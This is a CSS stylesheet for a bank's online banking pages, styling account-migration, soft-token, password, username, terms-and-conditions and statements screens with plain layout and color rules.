.alcbx-alcrb {position: relative;width: 20px;height: 20px;border: 1px solid #606060;border-radius: 4px;vertical-align: middle;cursor: pointer;background:white;}
.alcheckbox-wrapper{display:table-row}
.alcbx-alcrb.has-error {border: 1px solid #d81e05 !important;}
.alcbx-alcrb1{visibility: hidden;width: 0 !important;height: 0 !important;display: none;}
.alcbx-alcrb-wrapper {display: table-cell;}
.alcbx1{width:0!important;height:0!important;display:none}
.alcbx{position: relative;top: 1px;width: 20px;height: 20px;border: 1px solid #c5c5c5;border-radius: 3px;background: #fff;}
.alcbx-alcrb:after{content:'';position:absolute;top:3px;left:5px;width:6px;height:10px;opacity:0;transform:rotate(45deg) scale(0);border-right:2px solid #fff;border-bottom:2px solid #fff;}
.alcbx-alcrb1:checked~.alcbx-alcrb:after{opacity:1;transform:rotate(45deg) scale(1);}
.alcbx-alcrb1:checked~.alcbx-alcrb{background-color:#606060;border-color:#606060;}
.alcbx-alcrb1:disabled~.alcbx-alcrb{background-color:#ffffff; border-color:#c5c5c5;position:initial;}

.stTooltipMargin{margin-top: 0px !important;}

.push-icon-warning-signon { background: url(../images/warning_message.png) left center no-repeat; float:left;  width: 30px; height: 33px; margin-right: 20px!important;}
.push-icon-successs-signon { background: url(../images/success-message.png) left center no-repeat; float:left;  width: 30px; height: 33px; margin-right: 20px!important;}
.push-icon-spinner-signon { background: url(../images/spinner.gif) right center no-repeat; float:right;  width: 39px; height: 36px; margin-top:-2px; margin-left: 20px!important;}
.pushotpwizard-box { border-right: 1px solid #e0e0e0; border-left: 1px solid #e0e0e0; border-bottom: 1px solid #e0e0e0; border-top: 1px solid #e0e0e0; }
.pushotpwizard-form-content { padding: 25px; padding-top:10px; padding-bottom:10px; background: #F1F1F1; }
.pushotpbtn-holder { margin-top: 15px;}


.changepassword-otp-welcome-desc{font-size: 14px;  color: #606060; letter-spacing: 0px; line-height: 16px;}
.changepassword-wizard-form-content-main { padding: 25px; background: #E0E0E0; }
.changepassword-wizard-form-content-sub { padding: 25px; background: #EFEFEF; }
.icon-intercept-soft-token { background: url(../images/intercept-softToken-es-PA.png) left center no-repeat; float:left;  width: 57px; height: 69px; margin-right: 20px!important; margin-top: 20px;  margin-bottom: 20px;  margin-left: 20px}
.intercept-holder{margin-right: 20px!important; margin-top: 20px;  margin-bottom: 20px;  margin-left: 20px;}
.softTokenLockOutText{font-size: 15px;  color: #000000; letter-spacing: 0px; padding-top: 100px; margin-left: 22px;}
.softTokenLockOutErrorCode{font-size: 15px;  color: #808080; letter-spacing: 0px; padding-left: 22px; padding-bottom: 36px;}
.icon-lock-out-soft-token{background: url(../images/icon-soft-token-lock.png) left center no-repeat; float:left;  width: 75px; height: 60px; margin-right: 20px!important; margin-top: 20px;  margin-bottom: 20px;  margin-left: 20px}
.softtokenapplink,softtokenapplink:hover,softtokenapplink:active{border: 1px solid #ED0722 !important;border-radius: 8px;border-radius: 8px;text-align: center;background: #FFFF;font-size: 16px;width: 42%;color: #ED0722 !important;padding:9px;cursor:pointer;}
.spacebetweensofttokenlink{padding-left: 10px !important;}


.updatebnstxt{font-weight: bold;font-size: 20px;color: #000000;letter-spacing: -0.19px;line-height: 24px;}
.updatebnscontinuetxt{font-family: Arial;font-size: 15px;color: #606060;letter-spacing: -0.14px;line-height: 22px;}
.bnsiphonestorelink,bnsiphonestorelink:hover,bnsiphonestorelink:active {border: 1px solid #ED0722 !important;border-radius: 8px;border-radius: 8px;text-align: center;background: #FFFF;font-size: 16px;color: #ED0722 !important;padding:16px;cursor:pointer;width:272px;margin: 0 12px;}
.updatebnscontinueLink{font-family: Arial;font-size: 16px;color: #009DD6;letter-spacing: -0.15px;text-align: center;line-height: 22px}
.notestyletxt {font-family: Arial ; font-size: 18px;color: #D81E05 !important;letter-spacing: -0.11px;padding-top:25px}
.modalnote {border-radius: 6px;width:620px;height: 190px;margin-top: 65px;margin-left: 202px;margin-right: 202px;}
#mobileWebConfirmWindow.modal-dialog{width:620px !important; padding-left:202px;padding-right:202px;padding-top:65px}
#mobileWebConfirmWindow..modal-header{border-bottom : none}
.closebtn {margin-top: 10.9px !important; margin-right: 10.7px !important; width: 13.6px; height: 13.6px; color: #333333;}
.updatebnscontinue{font-family: Arial;font-size: 15px;color: #606060;letter-spacing: -0.14px;line-height: 22px;}
.updatebnscontinueBtn{font-family: Arial;font-size: 16px;color: #009DD6;letter-spacing: -0.15px;text-align: center;line-height: 22px;padding-left:52px}
.noteContinueText{font-family: Arial;font-size: 14px;color: #606060;letter-spacing: -0.13px;line-height: 20px}
.learnMoreLinkStyle{font-family: Arial;font-size: 16px;color: #009DD6;letter-spacing: -0.15px;text-align: center;line-height: 22px}
.modalyesbtn {width:80px;height:34px;}

.hrt-wizard-form-content-main { padding: 25px; background: #E0E0E0; }
.hrt-wizard-form-content-sub { padding: 20px; background: #EFEFEF; }
.hrt-title-text { font-family: Helvetica; font-size: 14px; color: #606060; padding-bottom: 15px!important;font-weight: normal;}
.hrt-addPayee-SearchBox { background: url(../images/payee/search.svg) no-repeat; background-position: left; background-position-x: 5px; background-color: #FFF; padding-left: 26px;  font-size: 13px; color: #B0B0B0; text-align: left; }
.hrt-payeeLabels { font-size: 16px; color: #606060; letter-spacing: -0.15px; line-height: 20px; font-weight: normal;}
.hrt-content-divider { padding: 8px; background: #E0E0E0; }
.hrt-button-block-background { background: #E0E0E0; padding-top: 20px; margin-right: -25px; margin-left: -25px; margin-top: 20px; margin-bottom: -25px;}
.cifupdate-wizard-form-content-main {background: #E0E0E0; padding: 25px; }
.cif-notes-panel {background: #FFFFFF; border-radius: 4px; padding: 10px;}
.cif-notes-line {font-size: 12px; color: #606060; letter-spacing: 0.25px; line-height: 18px; padding-top: 5px;}
.cif-notes-span { margin: 0 10px; float: left; }
.cif-update-child-wizard {background: #EFEFEF; margin-top: 20px; padding: 20px;}
.cif-update-form-title {  padding-left: 20px;  padding-right: 20px;   padding-top: 25px;    padding-bottom: 20px;}
.cif-edit-icon {
    background-color: #FFF; background: url(../images/edit-icon.svg) left top no-repeat;  width: 20px;  height: 20px;  display: block;
}
.hrt-element-bottom-position { padding-bottom: 5px;}
.hrt-margin-left{margin-left:25px;}
.hrt-rec-wizard-form-content-sub { padding: 25px; background: #EFEFEF; }
.error-msg-below-width_100 { color: #D81E05; nowhitespace: afterproperty; display: inline-block!important; margin: 0 0 0 0!important; text-align: left!important; word-wrap: break-word!important; /* Internet Explorer 5.5+ */ white-space: pre-wrap!important; width: 100%!important; }


.content-area-bg {  background-color: #e0e0e0;padding: 24px 24px 30px 24px;  }
.info-bg {  border-radius: 4px;  background-color: #ffffff;}
.info-bar {  width: 22px;  height: 22px;  object-fit: contain; }
.starting-today-you {  font-family: Arial;  font-size: 12px;  font-weight: normal;  font-style: normal;  font-stretch: normal;  line-height: 1.5;  letter-spacing: 0.25px;  color: #606060; padding: 12px 12px 12px 46px;}
.line {  padding-bottom: 25px;  border-bottom: solid 1px #e0e0e0;}
.banco-dominicano-del {  width: 282px;  height: 44px;  font-family: Arial;  font-size: 18px;  font-weight: normal;  font-style: normal;  font-stretch: normal;  line-height: 1.22;  letter-spacing: normal;  color: #333333; }
.rectangle-7 {  width: 240px;  height: 32px;  border-radius: 4px;  border: solid 1px #00a6e4;  background-color: #00a6e4; }
.rectangle-7:hover{background-color:#16B2EC !important; color:#FFF !important;}
.moving-your-account {  width: 282px;  height: 17px;  font-family: Arial;  font-size: 16px;  font-weight: normal;  font-style: normal;  font-stretch: normal;  line-height: normal;  letter-spacing: normal;  color: #606060; }
.start-account-migrat {  width: 240px;  height: 16px;  font-family: Arial;  font-size: 14px;  font-weight: bold;  font-style: normal;  font-stretch: normal;  line-height: normal;  letter-spacing: normal;  text-align: center;  color: #ffffff;padding-top: 8px}
.start-account-migrat:hover{color:#FFF !important;}
.btn-save-in { text-align: center; margin: 30px 0 0; }
.new-to-scotia-onLine {  width: 164px;  height: 22px;  font-family: Arial;  font-size: 16px;  font-weight: normal;  font-style: normal;  font-stretch: normal;  line-height: 1.38;  letter-spacing: normal;  color: #333333;}
.enroll-now {  width: 78px;  height: 17px;  font-family: Arial;  font-size: 16px;  font-weight: normal;  font-style: normal;  font-stretch: normal;  line-height: normal;  letter-spacing: normal;  color: #2a5db0;}
.scotiacard-number-username {  width: 228px;  height: 15px;  font-family: Arial;  font-size: 13px;  font-weight: bold;  font-style: normal;  font-stretch: normal;  line-height: normal;  letter-spacing: normal;  color: #606060;}
.important-not-advis {  width: 270px;  height: 19px;  font-family: Arial;  font-size: 12px;  font-weight: bold;  font-style: normal;  font-stretch: normal;  line-height: 1.58;  letter-spacing: normal;  color: #606060;}
.icon-position{position: absolute;margin: 10px 0 0 10px;}

/*****BDP migration changes******/
.bdpIdentification-card-1-bg {background-color: #f5f5f5; padding: 20px 20px 24px 20px;}
.bdp-icon-position{position: absolute;margin: 12px 0 0 16px;}
.bdpIdentification-Provide-your {font-family: Arial;font-size: 16px;font-weight: normal;font-style: normal;font-stretch: normal;line-height: 1.25;letter-spacing: normal;color: #000000;}
.bdpIdentification-To-get-started { font-family: Arial; font-size: 13px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.38; letter-spacing: normal; color: #606060; }
.bdpIdentification-Username { width: 382px; height: 18px; font-family: Arial; font-size: 13px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.38; letter-spacing: normal; color: #000000; }
.bdpIdentification-input-text {outline:none; border:none; width:100%; height: 18px; font-family: Arial; font-size: 13px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: 1.38; letter-spacing: normal; color: #606060; }
.bdpIdentification-input-box { width: 282px; height: 32px; border-radius: 4px; border: solid 1px #cccccc; background-color: #ffffff; }
.bdpIdentification-input-box.red{border: solid 1px #d81e05;}
.bdp-button-enabled { 
	margin-left: 5px;
	width: 90px;
  height: 32px;
  border-radius: 4px;
  border: solid 1px #979797;
  background-color: #606060; }
.bdp-button-font { font-family: Arial; font-size: 14px; font-weight: normal; font-style: normal; font-stretch: normal; line-height: normal; letter-spacing: normal; text-align: center; color: #ffffff; }
.bdp-button-disabled {width: 90px; height: 32px; border-radius: 4px;
	 border: solid 1px #c5c5c5; background-color: #c5c5c5; float: right; margin-left: 8px;}
.bdp-pwd-text {
  width:100%;
  padding-top: 0px;
  padding-bottom: 2px;
  border: none;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  -moz-border-radius: 4px;
  -ms-border-radius: 4px;
  -o-border-radius: 4px;
  background-color: ;
  font-size:13px;
  -ms-box-sizing:content-box;
  -moz-box-sizing:content-box;
  -webkit-box-sizing:content-box; 
  box-sizing:content-box;
  letter-spacing: normal; 
  color: #606060;
  outline: none;
  font-family: Arial; font-size: 13px; font-weight: normal; font-style: normal; font-stretch: normal;
  border: solid 1px #cccccc; background-color: #ffffff;
  float: left;
  height: 18px;
  line-height: 1.38;
}

.bdp-pwd-text.red {
    border: solid 1px #d81e05!important;
}

.bdp-pwd-text-width {
	width:256px !important;
}

.bdp-pwd-box {
  position: relative;
  width: 270px;
  height: 36px;
  border-radius: 4px;
 }
 
 .bdp-pwd-box1 {
  position: relative;
  width: 270px;
  border-radius: 4px;
 }

.bdp-pwd-box.red {
	border: solid 1px #d81e05;
}

.bdp-pwd-box1.red {
	border: solid 1px #d81e05;
}

.bdp-pwd-red{
	border: solid 1px #d81e05;
}

.bdp-eye-show
{
    width: 18px;
    height: 18px;
    background: url(../images/eye_show18-px.png) no-repeat;
    content: ' ';
    position: absolute;
    right: 0;
    top: 9px;
    cursor: pointer;
    display:block;
}

.bdp-eye-right {
	right: 10px !important;
	top: 7px !important;
}
.bdp-eye-hide
{
    width: 18px;
    height: 18px;
    background: url(../images/eye_hidden18-px.png) no-repeat;
    content: ' ';
    position: absolute;
    right: 0;
    top: 9px;
    cursor: pointer;
    display:none;
}

.bdpIdentification-buttons{
    padding-top: 30px;
    padding-bottom: 30px;
}

.bdp-button-red {
  width: 90px;
  height: 32px;
  border-radius: 4px;
  border: solid 1px #bd0000;
  background-color: #d81e05;
  margin-left: 8px;
  cursor: pointer;
  float: right;
}

.bdp-cancel-btn{
	 float: right;
	 white-space: nowrap;
}

.bdp-next-btn{
	padding-top:7px;
	white-space: nowrap;
}

a.linkstyle:hover, a.linkstyle:focus{
	color:#ffffff;
}

a.linkstyle-gray:hover, a.linkstyle-gray:focus{
	color:#606060;
}

/*BDP Authentication*/
.bdp-auth-bg-in {
  width: 650px;
  background-color: #f5f5f5;
  padding-bottom: 20px;
}

.bdp-auth-Enter-veri{
  font-family: Arial;
  font-size: 16px;
  font-weight: normal;
  font-style: normal;
  font-stretch: normal;
  line-height: 1.25;
  letter-spacing: normal;
  color: #000000;
}

.bdp-auth-if-the{
	padding-top:20px;
}

.bdp-auth-Please {
  font-family: Arial;
  font-size: 13px;
  font-weight: normal;
  font-style: normal;
  font-stretch: normal;
  line-height: 1.38;
  letter-spacing: normal;
  color: #606060;
}
.bdp-auth-Please.bold-text {
  font-weight: bold;
}

.bdp-auth-input-code-text {outline:none; border:none; width:100%; height: 18px; 
font-family: Arial; font-size: 13px; font-weight: normal; font-style: normal; font-stretch: normal; 
line-height: 1.38; letter-spacing: normal; color: #333333;position: center; }
.bdp-auth-input-code-box { width: 200px; height: 32px; border-radius: 4px; border: solid 1px #cccccc; background-color: #ffffff;}

.bdp-auth-did-text {
  width: 150px;
  height: 20px;
  font-family: Arial;
  font-size: 16px;
  font-weight: normal;
  font-style: normal;
  font-stretch: normal;
  line-height: 1.25;
  letter-spacing: -0.15px;
  color: #606060;
}
.bdp-auth-did-text.blue-text-link {
  color: #2a5db0;
}
.bdp-auth-did-div{
	float:left;
	white-space: nowrap;
	padding-left: 208px;
    margin-top: 7px;
}
input[type=text].bdp-auth::placeholder, input[type=text].bdp-auth-ms-input-placeholder, input[type=text].bdp-auth::-webkit-input-placeholder {
	outline:none; border:none; width:100%;
	font-family: Arial;
  font-size: 13px;
  font-weight: normal;
  font-style: normal;
  font-stretch: normal;
  line-height: 1.38;
  letter-spacing: 2px;
  color: #bfbfbf;
}

.bdp-combined-shape {
  width: 652px;
  height: 169px;
  box-shadow: 0 2px 10px 0 rgba(0, 40, 80, 0.07);
  background-color: #ffffff;
}

.bdp-content-area-bg-no-email {
  width: 700px;
  height: 281px;
  background-color: #e0e0e0;
  margin-left: -16px;
}

.bdp-existCustText { 
	font-size: 20px; 
	color: #000000; 
	letter-spacing: 0; 
	padding-top: 20px; 
	padding-bottom: 5px;  
	padding-left: 103px;
}

.icon-announcement { 
	background: url(../images/icon-announcement.png) left center no-repeat; 
	float:left;  
	width: 70px; 
	height: 63px; 
	margin-right: 20px!important; 
	margin-top: 20px;  
	margin-bottom: 20px;  
	margin-left: 20px;
}

.bdp-button-Signin {
    width: 96px !important;
    margin-left: 557px !important;   
}

/*BDP username */
.bdp-user-info-bg {
  height: 46px;
  border-radius: 4px;
  background-color: #ffffff;
}

.bdp-user-inner {
  background-color: #f5f5f5;
  padding: 24px;
}

.bdp-user-please-note {
  height: 18px;
  font-family: Arial;
  font-size: 12px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.5;
  letter-spacing: 0.25px;
  color: #606060;
}

.bdp-user-please-note.bold-text{font-weight: bold;}

.bdp-user-please-note-div{
	padding-top:14px;
	padding-left:35px;
}

.bdp-circle {
  -moz-border-radius: 50px/50px;
  -webkit-border-radius: 50px 50px;
  border-radius: 50px/50px;
  border: solid 1.5px #606060;
  width: 20px;
  height: 20px;  
  position: absolute;
}
.bdp-circle.green{
	border: solid 1.5px #138468;
}
.bdp-circle.red{
	border: solid 1.5px #d81e05;
}

.bdp-checkmark-green{
  content: " ";
  display: block;
  width: 0.4em; 
  height: 0.8em;
  border: solid #138468;
  border-width: 0 0.1em 0.1em 0; 
  position: relative;
  left: 0.5em;
  top: 0.5em;
  margin-top: -0.2em;
  -webkit-transform: rotate(45deg); 
  -moz-transform: rotate(45deg);
  -o-transform: rotate(45deg);
  transform: rotate(45deg);
}

.bdp-crossmark-red{
  padding-left: 0.35em;
  font-size:10px;
  color: #d81e05;
}

.bdp-username-error-msg{
	color: #D81E05; 
	margin: 5px 0 0 2px!important; 
	text-align: left!important 
}

.bdp-username-guide-text {
  width: 134px;
  height: 16px;
  font-family: Arial;
  font-size: 13.5px;
  font-weight: normal;
  font-style: normal;
  font-stretch: normal;
  line-height: normal;
  letter-spacing: 0.29px;
  color: #606060;
}

.bdp-disp-user-outer {
  width: 696px;
  height: 292px;
  background-color: #e0e0e0;
  padding: 24px;
}

.bdp-disp-user-inner {
  width: 650px;
  height: 180px;
  background-color: #f5f5f5;
  padding: 24px;
}

.bdp-display-username {
  width: 256px;
  height: 18px;
  font-family: Arial;
  font-size: 13px;
  font-weight: bold;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.38;
  letter-spacing: normal;
  color: #000000;
}

/* BDP pwd */
.bdp-pwd-inner1 {
    padding: 20px 20px 24px 20px;
    background-color: #f5f5f5;
}

/* BDP confirm */
.bdp-confirm-content-area-bg {  background-color: #e0e0e0;padding: 24px 24px 30px 24px;  }

.bdp-confirm-final-step {
  font-family: Arial;
  font-size: 13px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.38;
  letter-spacing: normal;
  color: #606060;
  padding: 24px 24px 0px 24px;
}

.bdp-confirm-card-1-bg {
  	height: 480px;
  	background-color: #f5f5f5;
}

.bdp-confirm-card-2-bg {
  	height: 70px;
  	background-color: #f5f5f5;
  	margin-top: 16px;
}

.bdp-confirm-rectangle {  
	height: 326px;  
	border: solid 1px #e5e5e5;  
	background-color: #ffffff; 
	padding-left: 24px;
	margin: 24px 24px 16px 24px;
}

.bdp-confirm-print {
  height: 16px;
  font-family: Arial;
  font-size: 14px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  text-align: center;
  color: #ffffff;
}

.bdp-confirm-rectangle-7 {
  width: 80px;
  height: 30px;
  border-radius: 4px;
  background-color: #606060;
  float: right;
  margin:0px 24px 0px 0px;
}

.bdp-confirm-agree {
  width: 380px;
  height: 22px;
  font-family: Arial;
  font-size: 13px;
  font-weight: bold;
  font-stretch: normal;
  font-style: normal;
  line-height: 2;
  letter-spacing: normal;
  color: #606060;
  vertical-align: middle;
}

.bdp-confirm-tandcHolder { 
	height: 323px; 
	background: #fff; 
	overflow: auto;
	padding-top: 24px;
}

.content-area-bg-success {
  width: 700px;
  height: 413px;
  background-color: #e0e0e0;
  padding: 24px 24px 30px 24px;
}

.combined-shape-success {
  width: 652px;
  height: 300px;
  box-shadow: 0 2px 10px 0 rgba(0, 40, 80, 0.07);
  background-color: #ffffff;
  
}

.congrats-welcome {
  width: 40px;
  height: 40px;
  object-fit: contain;
}

.congrats_icon {
  width: 38px;
  height: 38px;
}

.welcome-msg {
  width: 548px;
  height: 30px;
  font-family: Arial;
  font-size: 24px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #333333;
  padding-top: 19px;
  padding-left: 64px;
}

.migration-successfull2 {
  width: 575px;
  height: 48px;
  font-family: Arial;
  font-size: 18px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.33;
  letter-spacing: normal;
  color: #333333;
  padding-left: 78px;
  padding-top: 40px;
}

.migration-successfull3 {
  width: 575px;      
  height: 54px;
  font-family: Arial;
  font-size: 14px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.29;
  letter-spacing: -0.18px;
  color: #606060;
  padding-left: 78px;
  padding-top: 55px;
}

.migration-successfull4 {
  width: 575px;
  height: 36px;
  font-family: Arial;
  font-size: 14px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.29;
  letter-spacing: -0.18px;
  color: #606060;
  padding-left: 78px;
  padding-top: 64px;
}

.migarionSuccess-signin {
  width: 80px;
  height: 16px;
  font-family: Arial;
  font-size: 14px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  text-align: center;
  color: #ffffff;
  margin-left: 21px !important;
  margin-top: 6px !important
}	
	
.migarionSuccess-rectangle {	
  width: 120px;
  height: 32px;
  border-radius: 4px;
  border: solid 1px #bd0000;
  background-color: #d81e05;
  margin-left: 270px;
}

.bdp-sorry-we-couldnt {
  width: 615px;
  height: 44px;
  font-family: Arial;
  font-size: 20px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.1;
  letter-spacing: normal;
  color: #000000;
  padding-top: 37px;
}

.bdp-lockout-combined-shape {
  width: 652px;
  height: 117px;
  box-shadow: 0 2px 10px 0 rgba(0, 40, 80, 0.07);
  background-color: #ffffff;
}

.bdp-lockout-content-area-bg {  
	width: 700px;  
	height: 229px;  
	background-color: #e0e0e0;
	padding-top: 24px; 
	padding-left: 24px;
}

.bdp-lockout-modal-footer { 
	padding: 30px 20px 25px; 
	margin-top: 5px; 
	text-align: right; 
	border-top: none; 
}

.bdp-lockout-model-button {
	background-color: #D81E05;
    border-color: #D81E05;
    filter: none !important;
    vertical-align: top!important;
    width: 80px;
    height: 32px;
}

.bdp-has-error { border: 1px solid #D81E05!important; }
.bdp-remove-highlight {box-shadow: none!important;-webkit-box-shadow: none!important;border: none!important;}
.bdp-auth-error-msg { 
	color: #D81E05; 
	nowhitespace: afterproperty; 
	display: inline-block!important; 
	margin: 5px 0 0 17px!important;
	text-align: left!important; 
	word-wrap: break-word!important; 
	white-space: pre-wrap!important; 
	width: 85%!important; 
}

.bdp-auth-password-text {
  width: 136px;
  height: 18px;
  font-family: Arial;
  font-size: 13px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: 1.38;
  letter-spacing: normal;
  color: #333333;
}

.bdp-confirm-checkbox {
  position: relative;
  width: 22px;
  height: 22px;
  border-radius: 4px;
  border: solid 1px #c5c5c5;
  vertical-align: middle;
  cursor: pointer;
  background-color: #ffffff; 
}

.bdp-confirm-checkbox1{
	visibility: hidden;
	width: 0 !important;
	height: 0 !important;
	display: none;
}


.bdp-confirm-checkbox:after {
	content:'';
	position:absolute;
	top:2px;left:6px;
	width:7px;
	height:13px;
	opacity:0;
	transform:rotate(45deg) scale(0);
	border-right:2px solid #fff;
	border-bottom:2px solid #fff;
}

.bdp-confirm-checkbox1:checked~.bdp-confirm-checkbox:after{opacity:1;transform:rotate(45deg) scale(1);}
.bdp-confirm-checkbox1:checked~.bdp-confirm-checkbox{background-color:#3b99fc;}
.bdp-confirm-checkbox1:disabled~.bdp-confirm-checkbox{background-color:#ffffff; border-color:#c5c5c5;position:initial;}

.bdp-tandcHolder{height:auto;overflow:visible;}

.bdp-content-area-bg {
  width: 700px;
  height: 229px;
  background-color: #e0e0e0;
  padding-top: 24px;
}

.bdp-combined-shape-host {
  width: 652px;
  height: 117px;
  background-color: #ffffff;
  margin-left: 24px;
}

/*ONLINE Statements*/
.all-tabs div{
	white-space: nowrap;
	display: table-cell;
	padding: 10px;
	vertical-align: middle;
	border-right: 4px solid #ffffff;
	color: #606060;
  	border-collapse: inherit;
}
.tab-inactive{
	background-color: #f5f5f5;
}
.tab-active{
	background-color: #e0e0e0;
}
.all-tabs div:last-child { width: 100%; background-color: #ffffff;}
.stmts-tab-font {
  font-family: Arial;
  font-size: 12px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #606060;
}

.ncf-child-wizard {background: #EFEFEF; padding: 20px;}

.ncf-child-nostatements {background: #EFEFEF; padding: 6%;}
.stmts-table-header{font-family: Arial;
  font-size: 12px;
  font-weight: bold;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #2a5db0;
}
.ncf-noStatements-text{font-family: Arial;
  font-size: 12px;
  font-weight: bold;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #000000;
  padding-left:24%;
}

.stmts-table-contents{
  font-family: Arial;
  font-size: 13px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #2a5db0;
}

.amex-merc-apply{
	margin: 16px 180px 0 !important;
}

.amex-merc-bground{
	background:#EFEFEF !important;
	box-shadow: 0 0px 0px !important;

}

.amex-merc-bground-inner{
	background:#FFFFFF !important;
	border-bottom: 1px solid #EFEFEF !important;
}

.amex-homebottomtable {
    margin: 0 2% 0% 0% !important;
}

.username-circle {
  -moz-border-radius: 50px/50px;
  -webkit-border-radius: 50px 50px;
  border-radius: 50px/50px;
  border: solid 1.5px #606060;
  width: 20px;
  height: 20px;
  position: absolute;
}
.username-circle.green{
	border: solid 1.5px #138468;
}
.username-circle.red{
	border: solid 1.5px #d81e05;
}

.username-checkmark-green{
  content: " ";
  display: block;
  width: 0.4em;
  height: 0.8em;
  border: solid #138468;
  border-width: 0 0.1em 0.1em 0;
  position: relative;
  left: 0.5em;
  top: 0.5em;
  margin-top: -0.2em;
  -webkit-transform: rotate(45deg);
  -moz-transform: rotate(45deg);
  -o-transform: rotate(45deg);
  transform: rotate(45deg);
}

.username-crossmark-red{
  padding-left: 0.20em;
  font-size:10px;
  color: #d81e05;
}

.username-username-error-msg{
	color: #D81E05;
	margin: 5px 0 0 2px!important;
	text-align: left!important
}

.username-username-guide-text {
  width: 134px;
  height: 16px;
  font-family: Arial;
  font-size: 13.5px;
  font-weight: normal;
  font-style: normal;
  font-stretch: normal;
  line-height: normal;
  letter-spacing: 0.29px;
  color: #606060;
}


.username-icon-req-default {
    background-color: #FFF; background: url(../images/icon-req-default.svg)  no-repeat;  position: relative; width: 16px;  height: 16px;  display: block;
}

.username-icon-req-correct {
    background-color: #FFF; background: url(../images/icon-req-correct.svg)  no-repeat;  position: relative; width: 16px;  height: 16px;  display: block;
}

.username-icon-req-wrong {
    background-color: #FFF; background: url(../images/icon-req-wrong.svg)  no-repeat;  position: relative; width: 16px;  height: 16px;  display: block;
}

.hrt-title-text-user-name { font-family: Helvetica; font-size: 14px; color: #606060; padding-bottom: 15px!important;font-weight: bold;}
.userNameNotFoundText{ font-size: 20px;  color: #000000; letter-spacing: 0px; padding-top: 30px;}

.username-confirm-tandcHolder {
	height: 326px;
	background: #fff;
	overflow: auto;
	padding-top: 24px;
	font-size: 14px;
	color: #606060;
	bold: normal;
}

.recipientWarningText { font-size: 20px; color: #000000; letter-spacing: 0; padding-top: 20px; padding-bottom: 5px; padding-left: 100px; }

/*ONLINE Statements*/
.all-tabs div{
	white-space: nowrap;
	display: table-cell;
	padding: 10px;
	vertical-align: middle;
	border-right: 4px solid #ffffff;
	color: #606060;
  	border-collapse: inherit;
}
.tab-inactive{
	background-color: #f5f5f5;
}
.tab-active{
	background-color: #e0e0e0;
}
.all-tabs div:last-child { width: 100%; background-color: #ffffff;}
.stmts-tab-font {
  font-family: Arial;
  font-size: 12px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #606060;
}

.ncf-child-wizard {background: #EFEFEF; padding: 20px;}

.ncf-child-nostatements {background: #EFEFEF; padding: 6%;}
.stmts-table-header{font-family: Arial;
  font-size: 12px;
  font-weight: bold;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #2a5db0;
}
.ncf-noStatements-text{font-family: Arial;
  font-size: 12px;
  font-weight: bold;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #000000;
  padding-left:24%;
}

.stmts-table-contents{
  font-family: Arial;
  font-size: 13px;
  font-weight: normal;
  font-stretch: normal;
  font-style: normal;
  line-height: normal;
  letter-spacing: normal;
  color: #2a5db0;
}

.amex-merc-apply{
	margin: 16px 180px 0 !important;
}

.amex-merc-bground{
	background:#EFEFEF !important;
	box-shadow: 0 0px 0px !important;

}

.amex-merc-bground-inner{
	background:#FFFFFF !important;
	border-bottom: 1px solid #EFEFEF !important;
}

.amex-homebottomtable {
    margin: 0 2% 0% 0% !important;
}
.changepd-newpwd-default {
    float:left; clear: none; width:100%; background:white;border:1px solid #ccc; border-radius: 4px;height:32px!important
}
.changepd-newpwd-error {
    float:left; clear: none; width:100%; background:white;border:1px solid #D81E05; border-radius: 4px;height:32px!important
}

.icon-intercept-username-create {
    background: url(../images/announcement-icon-new.svg) left center no-repeat; float:left;  width: 47px; height: 33px; margin-right: 20px!important;
    margin-top: 20px;  margin-bottom: 20px;  margin-left: 0px;
 }
	
.mortgageDeful{
    margin-left: 60px;
    margin-right: 60px;
    font-family:Scotia !important;
}
.mortgageDefli{
    line-height: 18px;
    padding-top: 10px;
	font-family:Scotia !important;
}

.exp-collapse1 a:after { font-family: fontAwesome; font-weight: normal; font-style: normal; text-decoration: inherit; -webkit-font-smoothing: antialiased; content: "\f0da"; color: #d81e05; /*do not change this one ---- its reflecting for multiple*/ position: absolute; font-size: 18px; }
.exp-collapse1 a.Open:after { content: "\f0d7" }
.exp-collapse1 h2 a:after { margin: -2px 0 0 7px; font-size: 25px!important; }
.linkColor{
	color:red !important;
	font-size: 16px;
	font-weight: bold;}

.close_icon_cap { background: url(../images/close-icon-cap.png) center top no-repeat; width: 30px; height: 30px; border: 0; float: right; margin: -5px 0 0 0; }

.mortgageDefliConsent{
    line-height: 18px; padding-top: 10px;
    font-family:Scotia !important; font-size: 16px; 
    letter-spacing: 0; line-height: 18px;
}

.refNo-error-msg{
	color: #D81E05; 
	margin: 5px 0 0 2px!important; 
	text-align: left!important;
	width: 65%; 
}

.refNo-box { width: 300px; height: 32px; border-radius: 4px; border: solid 1px #cccccc; background-color: #ffffff; text-align: center;}
